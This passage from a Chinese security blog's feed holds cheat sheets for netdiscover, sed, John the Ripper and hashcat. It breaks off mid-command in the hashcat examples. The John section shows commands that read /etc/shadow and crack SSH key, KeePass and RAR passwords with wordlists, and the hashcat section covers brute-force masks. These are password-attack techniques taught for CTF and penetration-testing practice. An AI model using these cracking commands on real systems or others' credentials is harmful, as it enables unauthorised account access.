      在ctf中的正则过滤中，快速找到未被过滤的php函数
    
    </summary>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="fuzz" scheme="http://h3art3ars.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>netdiscover</title>
    <link href="http://h3art3ars.github.io/2019/12/11/netdiscover/"/>
    <id>http://h3art3ars.github.io/2019/12/11/netdiscover/</id>
    <published>2019-12-11T07:24:40.000Z</published>
    <updated>2019-12-11T07:26:52.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><ul><li><p>快捷使用    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">netdiscover -p [-r] 被动模式</span></pre></td></tr></table></figure></li><li></li><li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Netdiscover是一个简单的ARP扫描器，可用于扫描网络中的活动主机。它也可以扫描多个子网。它只是在实时显示（ncurse）中产生输出。可以在可进入网络的渗透测试的第一阶段中使用。Netdiscover是一个简单的初始侦查工具，非常方便。 </p></li><li><h3 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h3><ol><li>简单的Arp扫描仪</li><li>可在主动和被动模式下工作</li><li>实时显示已识别的主机</li><li>能够扫描多个子网</li><li>定时选项</li></ol></li><li><h3 id="选项："><a href="#选项：" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-i设备：您的网络设备</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-r范围：扫描给定范围而不是自动扫描。192.168.6.0&#x2F;24,&#x2F;16,&#x2F;8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-l文件：扫描包含在给定文件中的范围列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-p被动模式：不发送任何内容，仅嗅探</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">-m文件：扫描已知的MAC和主机名列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">-F过滤器：自定义pcap过滤器表达式（默认值：“ arp”）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">-s时间：每个arp请求之间的睡眠时间（毫秒）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">-n节点：用于扫描的最后一个IP八位字节（从2到253）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-c count：发送每个arp请求的次数（对于丢包的网络）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">-f启用快速模式扫描，节省大量时间，建议用于自动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">-d忽略用于自动扫描和快速模式的家庭配置文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-S在每个请求之间启用睡眠时间抑制（硬核模式）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">-P打印结果的格式适合于另一个程序进行解析</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-N不打印标题。仅在启用-P时有效。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">-L在可解析输出模式（-P）中，在活动扫描完成后继续侦听</span></pre></td></tr></table></figure><p><strong>指定范围</strong></p><p>我们可以使用-r选项扫描特定范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -r &lt;范围&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr></table></figure><p><strong>文件中的多个范围</strong></p><p>我们还可以扫描多个范围。当您的大型网络具有多个子网和网络时，这很有用。为此，我们只需要逐行指定要扫描的所有范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -l &lt;包含范围的文件&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -l 范围</span></pre></td></tr></table></figure><p>有时最好保持安静。-p选项对此有所帮助，但要以耐心为代价。        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -p -r &lt;范围，可选&gt;</span></pre></td></tr></table></figure><p><strong>输出</strong></p><p>如果要将其通过管道传输到文件，也有一个可分析的输出选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -P &lt;可分析&gt; -N &lt;省略标题&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.1&#x2F;24 -PN</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      netdiscover用于快速的主动或被动的发现存活主机
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
      <category term="扫描" scheme="http://h3art3ars.github.io/tags/%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>sed</title>
    <link href="http://h3art3ars.github.io/2019/12/11/sed/"/>
    <id>http://h3art3ars.github.io/2019/12/11/sed/</id>
    <published>2019-12-11T07:12:47.000Z</published>
    <updated>2019-12-11T07:19:39.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h1><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>sed [-hnV] [-e (script)][-f (script-file)][file]</code></p><p><strong>参数说明</strong>：</p><ul><li>-e script或–expression=script 以选项中指定的script来处理输入的文本文件。<strong>可使用多个-e参数执行多个动作</strong></li><li>-f&lt;script文件&gt;或–file=&lt;script文件&gt; 以选项中指V定的script文件来处理输入的文本文件。</li><li>-h或–help 显示帮助。</li><li>-n或–quiet或–silent 仅显示script处理后的结果。</li><li>-V或–version 显示版本信息。</li><li>-i 直接替换文件中内容，不用打开</li></ul><p><strong>动作说明</strong>：</p><ul><li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li><li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li><li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li><li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li><li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li><li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g </li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.添加–<strong>a</strong>（行后）</p><pre><code>在第四行添加一行内容为  *newline*`sed &apos;4a newline&apos;`</code></pre><p>2.取代–<strong>c</strong></p><pre><code>将2-5行内容换成*2-5line*`sed &apos;2,5c 2-5line&apos;`2-5行的全部内容换成一个字串2-5line，并不是每行都会单独取代</code></pre><p>3.删除–<strong>d</strong></p><pre><code>删除4到最后一行`sed &apos;4,$d&apos;`</code></pre><p>4.插入–<strong>i</strong>（行前）</p><pre><code>在第1行插入内容为*firstline*与secline两行`sed &apos;1i first\``secline&apos;`</code></pre><p>5.搜寻</p><pre><code>寻找含有root的行并删除`sed &apos;/root/d&apos;`</code></pre><p>5.替换–<strong>s</strong></p><pre><code>`sed s/被替换/替换/g`类似vim一样的用法</code></pre><p><strong>去除空行用vim中<code>：%s/\n//g</code> 不要用sed ，很复杂</strong></p>]]></content>
    
    <summary type="html">
    
      sed命令，可对文件进行插入，添加，删除。替换操作
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="文件操作" scheme="http://h3art3ars.github.io/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>john</title>
    <link href="http://h3art3ars.github.io/2019/12/11/john/"/>
    <id>http://h3art3ars.github.io/2019/12/11/john/</id>
    <published>2019-12-11T07:04:58.000Z</published>
    <updated>2019-12-11T07:09:32.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="john"><a href="#john" class="headerlink" title="john"></a>john</h1><ul><li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;rockyou.txt .&#x2F;shadow</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">john --show .&#x2F;shadow</span></pre></td></tr></table></figure></li><li><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><img src="/images/john.png" alt="help"></p></li><li><h3 id="attact"><a href="#attact" class="headerlink" title="attact"></a>attact</h3><p> 在破解密码方面，有三种类型的攻击：<br>1.暴力破解：通过依次处理每个可能的字母、数字和特殊字符组合来猜测密码。这是一个很漫长的过程，但却很有效果。<br>2.字典攻击：此攻击利用包含常见密码列表的文件(通常取自某种类型的漏洞)来猜测给定的密码。在CTF中应用比较广泛，但在正常情况下不是特别常见。<br>3.彩虹表：彩虹表是一系列预先计算好的散列。其思想是，这些彩虹表包含给定算法的所有散列。通过查找代替了破解。请注意，这需要相当大的处理能力才能实现。 </p></li><li><h3 id="默认大字典"><a href="#默认大字典" class="headerlink" title="默认大字典"></a>默认大字典</h3><p><a href="https://wiki.skullsecurity.org/Passwords" target="_blank" rel="noopener">字典地址</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo gunzip &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">wc -l &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span></pre></td></tr></table></figure></li><li><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li><h4 id="linux密码"><a href="#linux密码" class="headerlink" title="linux密码"></a>linux密码</h4><p>将passwd与shadow转换成john可破解格式（现已可直接破解）</p><p><code>unshadow /etc/passed /etc/shadow &gt; ./password</code></p><p><code>john --wordlist=/usr/share/wordlist/rockyou.txt ./password</code></p></li><li><h4 id="SSH密钥"><a href="#SSH密钥" class="headerlink" title="SSH密钥"></a>SSH密钥</h4><p> 要测试JTR的SSH密钥密码破解能力，首先要创建一组新的私钥。注意：JTR没有破解文件本身(即生成的密钥中的字节数并不重要)，JTR只是破解私钥的加密密码。<br>在这种情况下，使用可预测的密码创建公钥/私钥对： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># Create some private key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># Create encrypted zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;ssh2john ~&#x2F;.ssh&#x2F;id_rsa &gt; id_rsa.hash</span></pre></td></tr></table></figure><p>接下来，您需要做的就是使用您的字典将John the Ripper指向给定文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash</span></pre></td></tr></table></figure></li><li><h4 id="Keepass2数据库（不常用）"><a href="#Keepass2数据库（不常用）" class="headerlink" title="Keepass2数据库（不常用）"></a>Keepass2数据库（不常用）</h4><p> Keepass怎么样？如果您不知道，Keepass是一个开源的，跨平台的密码管理库。<br> 所以让我们创建一个可以攻击的库。首先，安装Keepass CLI(“kpcli”)。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y kpcli</span></pre></td></tr></table></figure><p> 接下来，创建库。你不需要在库里存储任何密码，一个空的库就可以了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ kpcli</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">KeePass CLI (kpcli) v3.1 is ready for operation.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Type &#39;help&#39; for a description of available commands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Type &#39;help &lt;command&gt;&#39; for details on individual commands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; saveas newdb.kdb</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Please provide the master password: *************************</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">Retype to verify: *************************</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; exit</span></pre></td></tr></table></figure><p> 与攻击SSH私钥和Linux密码散列一样，将Keepass数据库转换为与JTR兼容的格式。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">keepass2john newdb.kdb &gt; newdb.kdb.hash</span></pre></td></tr></table></figure><p> 攻击！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt newdb.kdb.hash</span></pre></td></tr></table></figure></li><li><h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># Install rar</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y rar</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># Create some dummy file</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot; &gt; hello.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"># Create an encrypted RAR file with the password &quot;password&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">rar a -hppassword encrypted.rar hello.txt</span></pre></td></tr></table></figure><p> 接下来，将其转换为JTR的攻击格式：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">rar2john encrypted.rar &gt; encrypted.rar.hash</span></pre></td></tr></table></figure><p> 之后用john破解</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      使用john暴力破解linux的shadow文件
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="密码破解" scheme="http://h3art3ars.github.io/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>hashcat</title>
    <link href="http://h3art3ars.github.io/2019/12/11/hashcat/"/>
    <id>http://h3art3ars.github.io/2019/12/11/hashcat/</id>
    <published>2019-12-11T06:58:11.000Z</published>
    <updated>2019-12-11T07:01:52.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><ul><li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hash]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result     [字典]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hashfile]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result [批量hash]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 0 --force f2aec315704b5f007915bdbbae5a9f5c te?d?d?dst [掩码爆破]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">hashcat -a 6 -m 0 --force 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l [字典掩码]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">hashcat [hash] --show</span></pre></td></tr></table></figure></li><li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Hashcat是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持hashcat的散列算法有Microsoft LM哈希，MD4，MD5，SHA系列，Unix加密格式，MySQL和Cisco PIX等。 </p></li><li><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">--increment-max  密码最大长度,同上</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">--remove     删除已被破解成功的hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-r       使用自定义破解规则</span></pre></td></tr></table></figure><ul><li><h4 id="a参数破解模式"><a href="#a参数破解模式" class="headerlink" title="a参数破解模式"></a><strong>a</strong>参数破解模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"> # | Mode</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> 0 | Straight（字段破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> 1 | Combination（多字典组合破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> 3 | Brute-force（掩码暴力破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</span></pre></td></tr></table></figure></li><li><h4 id="m参数hash类型（详见文末）"><a href="#m参数hash类型（详见文末）" class="headerlink" title="m参数hash类型（详见文末）"></a><strong>m</strong>参数hash类型（详见文末）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">- [ Hash modes ] -</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">      # | Name                                             | Category</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">   5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">   1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">   1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">   1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">     10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr></table></figure></li><li><h3 id="掩码设置"><a href="#掩码设置" class="headerlink" title="掩码设置"></a>掩码设置</h3><ul><li>常见字符集</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz          纯小写字母(lower)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母(upper)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">d | 0123456789                      纯数字(decimal)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">h | 0123456789abcdef                常见小写子目录和数字(hex)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">H | 0123456789ABCDEF               常见大写字母和数字(HEX)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符(special)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">a | ?l?u?d?s                    键盘上所有可见的字符(all_printable)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">b | 0x00 - 0xff                 可能是用来匹配像空格这种密码的(bin)</span></pre></td></tr></table></figure><ul><li><strong>eg：</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">八位数字密码：?d?d?d?d?d?d?d?d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">八位未知密码：?a?a?a?a?a?a?a?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span></pre></td></tr></table></figure></li></ul></li></ul><ul><li><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>- #### 7位数字破解</code></pre></li></ul><pre><code> `    hashcat -a 3 -m 